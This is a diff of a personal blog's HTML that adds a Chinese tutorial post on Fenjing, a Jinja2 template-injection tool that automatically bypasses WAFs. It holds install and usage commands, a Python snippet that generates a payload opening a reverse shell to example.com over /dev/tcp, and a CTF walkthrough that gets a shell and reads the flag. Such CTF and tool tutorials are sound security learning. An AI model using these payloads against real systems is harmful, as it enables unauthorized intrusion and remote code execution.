@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.7.7">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="https://yixinbc.tech/archives/2023/"/>
+  
+  <link rel="canonical" href="https://yixinbc.tech/2023/05/11/fenjing/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -25,23 +25,25 @@
   <!-- Custom Files headBegin begin-->
   
   <!-- Custom Files headBegin end-->
-  <link rel="preload" href="../../css/style.css" as="style">
+  <link rel="preload" href="../../../../css/style.css" as="style">
   <link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 <link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>归档：2023 - yixinBC's blog</title>
+  <title>fenjing(焚靖)——jinja2 SSTI一把梭 - yixinBC's blog</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="yixinBC的个人博客 - yixinBC - yixinBC's blog">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="yixinBC&#39;s blog">
-<meta property="og:url" content="https://yixinbc.tech/archives/2023/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fenjing(焚靖)——jinja2 SSTI一把梭">
+<meta property="og:url" content="https://yixinbc.tech/2023/05/11/fenjing/index.html">
 <meta property="og:site_name" content="yixinBC&#39;s blog">
-<meta property="og:description" content="yixinBC的个人博客">
+<meta property="og:description" content="焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能  安装使用pip（最省事）12pip install fenjingpython -m fenjing scan --url &amp;#x27;http:&#x2F;&#x2F;xxx&#x2F;&amp;#x27;  也可下载并运行docker镜像12docker pull marven11&#x2F;fenjingdocker run --net host -it">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2023-05-11T18:36:24.000Z">
+<meta property="article:modified_time" content="2023-05-11T11:37:03.816Z">
 <meta property="article:author" content="yixinBC">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1665,8 +1667,8 @@ ul.list-v >li>a:hover {
 }
 
   </style>
-  <link rel="stylesheet" href="../../css/style.css" media="print" onload="this.media='all';this.onload=null">
-  <noscript><link rel="stylesheet" href="../../css/style.css"></noscript>
+  <link rel="stylesheet" href="../../../../css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="../../../../css/style.css"></noscript>
   
 <script>
 if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
@@ -1738,7 +1740,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   volantis.GLOBAL_CONFIG ={
     debug: "env",
-    cdn: {"js":{"app":"../../js/app.js","parallax":"../../js/plugins/parallax.js","rightMenu":"../../js/plugins/rightMenu.js","rightMenus":"../../js/plugins/rightMenus.js","sites":"../../js/plugins/tags/sites.js","friends":"../../js/plugins/tags/friends.js","contributors":"../../js/plugins/tags/contributors.js","search":"../../js/search/hexo.js"},"css":{"style":"../../css/style.css"}},
+    cdn: {"js":{"app":"../../../../js/app.js","parallax":"../../../../js/plugins/parallax.js","rightMenu":"../../../../js/plugins/rightMenu.js","rightMenus":"../../../../js/plugins/rightMenus.js","sites":"../../../../js/plugins/tags/sites.js","friends":"../../../../js/plugins/tags/friends.js","contributors":"../../../../js/plugins/tags/contributors.js","search":"../../../../js/search/hexo.js"},"css":{"style":"../../../../css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
     lastupdate: new Date(1683805029476),
     sidebar: {
@@ -2179,7 +2181,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 		<div class="nav-main">
       
         
-        <a class="title flat-box" target="_self" href='../../index.html'>
+        <a class="title flat-box" target="_self" href='../../../../index.html'>
           
             <img no-lazy class='logo' src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
           
@@ -2197,7 +2199,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
               <li>
                 <a class="menuitem flat-box faa-parent animated-hover"
-                href="../../index.html" title="博客"
+                href="../../../../index.html" title="博客"
                   
                   
                   
@@ -2214,11 +2216,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
               <li>
                 <a class="menuitem flat-box faa-parent animated-hover"
-                href="../" title="归档"
+                href="../../../../archives/" title="归档"
                   
                   
                   
-                    active-action="action-home"
+                    active-action="action-archives"
                   >
                   <i class='fa-solid fa-archive fa-fw'></i>归档
                 </a>
@@ -2250,7 +2252,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
               <li>
                 <a class="menuitem flat-box faa-parent animated-hover"
-                href="../../index.html" title="博客"
+                href="../../../../index.html" title="博客"
                   
                   
                   
@@ -2267,11 +2269,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
               <li>
                 <a class="menuitem flat-box faa-parent animated-hover"
-                href="../" title="归档"
+                href="../../../../archives/" title="归档"
                   
                   
                   
-                    active-action="action-home"
+                    active-action="action-archives"
                   >
                   <i class='fa-solid fa-archive fa-fw'></i>归档
                 </a>
@@ -2297,7 +2299,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  dock' style="display: ;">
+      <div id="half" class='cover-wrapper post dock' style="display: ;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
 
@@ -2330,23 +2332,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="https://yixinbc.tech/2023/05/11/fenjing/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="yixinBC's blog">
@@ -2356,118 +2342,238 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="yixinBC的个人博客">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="../../2023/05/11/fenjing/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         fenjing(焚靖)——jinja2 SSTI一把梭
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
+      </h1>
+      <div class='new-meta-box'>
         
-焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
 
-安装使用pip（最省事）12pip install fenjingpython -m fenjing scan --url &#x27;http://xxx/&#x27;
+          
+        
+          
+            
 
-也可下载并运行docker镜像12docker pull marven11/fenjingdocker run --net host -...
-      
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-05-11T18:36:24+00:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2023年5月11日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <blockquote>
+<p>焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能</p>
+</blockquote>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="使用pip（最省事）"><a href="#使用pip（最省事）" class="headerlink" title="使用pip（最省事）"></a>使用pip（最省事）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install fenjing</span><br><span class="line">python -m fenjing scan --url &#x27;http://xxx/&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="也可下载并运行docker镜像"><a href="#也可下载并运行docker镜像" class="headerlink" title="也可下载并运行docker镜像"></a>也可下载并运行docker镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull marven11/fenjing</span><br><span class="line">docker run --net host -it marven11/fenjing scan --url &#x27;http://xxx/&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="还可以直接下载源码"><a href="#还可以直接下载源码" class="headerlink" title="还可以直接下载源码"></a>还可以直接下载源码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Marven11/Fenjing</span><br><span class="line">cd Fenjing</span><br></pre></td></tr></table></figure>
+
+<p>下载后可以选择直接使用（先确保用pip安装完依赖）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<p>也可以手动构建一个docker镜像</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t fenjing .</span><br><span class="line">docker run -it --net host fenjing scan --url &#x27;http://xxx/&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -m fenjing --<span class="built_in">help</span></span></span><br><span class="line">Usage: python -m fenjing [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --help  Show this message and exit.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  crack  攻击指定的表单</span><br><span class="line">  scan   扫描指定的网站</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -m fenjing crack --<span class="built_in">help</span></span></span><br><span class="line">Usage: python -m fenjing crack [OPTIONS]</span><br><span class="line"></span><br><span class="line">  攻击指定的表单</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -u, --url TEXT       form所在的URL</span><br><span class="line">  -a, --action TEXT    form的action，默认为当前路径</span><br><span class="line">  -m, --method TEXT    form的提交方式，默认为POST</span><br><span class="line">  -i, --inputs TEXT    form的参数，以逗号分隔</span><br><span class="line">  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式</span><br><span class="line">  --interval FLOAT     每次请求的间隔</span><br><span class="line">  --user-agent TEXT    请求时使用的User Agent</span><br><span class="line">  --help               Show this message and exit.</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -m fenjing scan --<span class="built_in">help</span></span></span><br><span class="line">Usage: python -m fenjing scan [OPTIONS]</span><br><span class="line"></span><br><span class="line">  扫描指定的网站</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -u, --url TEXT       需要扫描的URL</span><br><span class="line">  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式</span><br><span class="line">  --interval FLOAT     每次请求的间隔</span><br><span class="line">  --user-agent TEXT    请求时使用的User Agent</span><br><span class="line">  --help               Show this message and exit.</span><br></pre></td></tr></table></figure>
+
+<p>也可做为一个python模块集成进脚本中使用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level = logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;config&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;request&quot;</span>, <span class="string">&quot;lipsum&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;０&quot;</span>,<span class="string">&quot;１&quot;</span>,<span class="string">&quot;２&quot;</span>,<span class="string">&quot;３&quot;</span>,<span class="string">&quot;４&quot;</span>,<span class="string">&quot;５&quot;</span>,<span class="string">&quot;６&quot;</span>,<span class="string">&quot;７&quot;</span>,<span class="string">&quot;８&quot;</span>,<span class="string">&quot;９&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">payload, _ = exec_cmd_payload(waf, <span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<h2 id="支持的绕过"><a href="#支持的绕过" class="headerlink" title="支持的绕过"></a>支持的绕过</h2><ul>
+<li><code>&#39;</code>和<code>&quot;</code>的绕过</li>
+<li>绝大部分关键字的绕过</li>
+<li>自然数的绕过</li>
+<li>下划线<code>_</code></li>
+<li><code>+</code>和<code>-</code></li>
+<li><code>~</code></li>
+<li><code>[</code>下标访问的绕过</li>
+<li><code>&#123;&#123;&#125;&#125;</code>标签的绕过</li>
+</ul>
+<h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3745">[GDOUCTF 2023]&lt;ez_ze&gt;</a><br>打开题目发现是一个使用POST提交表单的网页，检查响应头的<code>Sever</code>字段，发现是<code>Werkzeug/2.2.3 Python/3.8.16</code>，所以应该是一个flask程序，考虑SSTI。<br>使用一些常见的jinja2 SSTI payload，发现都会被WAF给过滤。<br>尝试焚靖一把梭：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -m fenjing crack -u http://node1.anna.nssctf.cn:28140/get_flag -i name</span></span><br><span class="line">    ____             _ _</span><br><span class="line">   / __/__  ____    (_|_)___  ____ _</span><br><span class="line">  / /_/ _ \/ __ \  / / / __ \/ __ `/</span><br><span class="line"> / __/  __/ / / / / / / / / / /_/ /</span><br><span class="line">/_/  \___/_/ /_/_/ /_/_/ /_/\__, /</span><br><span class="line">              /___/        /____/</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">INFO:[cli] | Use Ctrl+D to exit.</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&gt;&gt; <span class="built_in">cat</span> /flag</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Hello, $ NSSCTF&#123;82377006-eb0f-4ebd-9a9f-ba6ad3ba7c17&#125;</span><br><span class="line"><span class="meta prompt_"> $</span><span class="language-bash">!</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&gt;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可见焚靖的WAF绕过能力还是非常强大的</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">Marven11&#x2F;Fenjing: 一个类似SQLMap的Jinja2 SSTI利用脚本 | A SQLMap-like Jinja2 SSTI cracker</a>（官方GitHub页面）</p>
+<h2 id="想找一个通用的SSTI-payload生成器？"><a href="#想找一个通用的SSTI-payload生成器？" class="headerlink" title="想找一个通用的SSTI payload生成器？"></a>想找一个通用的SSTI payload生成器？</h2><p>可以去尝试一下<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a></p>
+
+  </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-05-11T18:36:24+00:00">2023-05-11</time>
-        
-      </div>
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='../../2023/05/11/fenjing/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-05-11T11:37:03+00:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2023年5月11日</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="https://yixinbc.tech/2023/04/21/hello-world/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="yixinBC's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="yixinBC's blog">
-    <meta itemprop="description" content="yixinBC的个人博客">
-  </span>
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yixinbc.tech/2023/05/11/fenjing/&title=fenjing(焚靖)——jinja2 SSTI一把梭 - yixinBC's blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://yixinbc.tech/2023/05/11/fenjing/&title=fenjing(焚靖)——jinja2 SSTI一把梭 - yixinBC's blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://yixinbc.tech/2023/05/11/fenjing/&title=fenjing(焚靖)——jinja2 SSTI一把梭 - yixinBC's blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
   
+
   
+    <div class="prev-next">
+      
+      
+        <a class='next' href='../../../04/21/hello-world/'>
+          <p class='title'>Hexo + volantis配置<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>移步GitHub 仓库查看配置文件源码。
+</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="../../2023/04/21/hello-world/"  itemprop="url">
-        Hexo + volantis配置
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        移步GitHub 仓库查看配置文件源码。
 
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-04-21T15:00:00+00:00">2023-04-21</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='../../2023/04/21/hello-world/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
+    <div id="layoutHelper-comments"></div>
 
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
+  </article>
 
 
-	
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2476,75 +2582,40 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box circle' target="_blank" rel="noopener" href='https://github.com/yixinBC'>
-          <img no-lazy src='https://avatars.githubusercontent.com/u/61578883?v=4'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>yixinBC</h2>
-        
-        
-          <p>always learning</p>
-
-        
-        
-          <p><span id="jinrishici-sentence">yixinBC's blog</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="../../atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="../../mailto:yixinbc@foxmail.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/yixinBC"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
     
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pip%EF%BC%88%E6%9C%80%E7%9C%81%E4%BA%8B%EF%BC%89"><span class="toc-text">使用pip（最省事）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%B8%8B%E8%BD%BD%E5%B9%B6%E8%BF%90%E8%A1%8Cdocker%E9%95%9C%E5%83%8F"><span class="toc-text">也可下载并运行docker镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81"><span class="toc-text">还可以直接下载源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-text">使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">支持的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-text">使用示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%83%B3%E6%89%BE%E4%B8%80%E4%B8%AA%E9%80%9A%E7%94%A8%E7%9A%84SSTI-payload%E7%94%9F%E6%88%90%E5%99%A8%EF%BC%9F"><span class="toc-text">想找一个通用的SSTI payload生成器？</span></a></li></ol>
+    </div>
+  </section>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
